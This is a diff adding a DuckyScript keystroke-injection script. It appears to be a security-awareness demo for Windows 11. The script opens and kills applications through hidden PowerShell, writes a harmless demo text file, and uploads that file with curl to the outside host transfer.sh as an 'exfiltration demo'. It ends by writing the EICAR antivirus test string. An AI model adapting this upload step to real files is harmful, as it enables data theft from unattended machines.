@@ -1,0 +1,54 @@
+REM 🛡️ Demo 
+REM ✅ Windows 11
+
+DELAY 5000
+
+REM ----------------------------------------------------------------
+REM OPEN & CLOSE APPLICATION Demo
+REM ----------------------------------------------------------------
+REM 👉 Open Calculator
+GUI r
+DELAY 500
+STRING calc
+ENTER
+DELAY 2000
+
+REM 👉 Open Editor
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 3000
+
+REM 👉 Close Calculator
+GUI r
+DELAY 500
+STRING powershell -windowstyle hidden -command "taskkill /F /IM calculator.exe"
+ENTER
+
+REM ----------------------------------------------------------------
+REM | EXFILTRATION Demo 
+REM ----------------------------------------------------------------
+REM 👉 Create demo file with timestamp
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden -command "Set-Content -Path $env:USERPROFILE\\Desktop\SecurityDemo.txt -Value 'Das ist eine Demo einer Exfiltration. Deine IT-Sicherheit <3 '"
+ENTER
+DELAY 5000
+
+REM 👉 Send file content to the internet
+GUI r
+DELAY 1000
+STRING powershell -NoExit -Command "curl -X PUT --upload-file \"$env:USERPROFILE\Desktop\SecurityDemo.txt\" https://transfer.sh/SecurityDemo.txt"
+ENTER
+DELAY 5000
+
+
+REM ----------------------------------------------------------------
+REM | EICAR Trigger
+REM ----------------------------------------------------------------
+REM 👉 Trigger antivirus with EICAR test file
+GUI r
+DELAY 1000
+STRING powershell -c "Set-Content -Path $env:USERPROFILE\\Desktop\\EICAR-Test.txt -Value 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'"
+ENTER
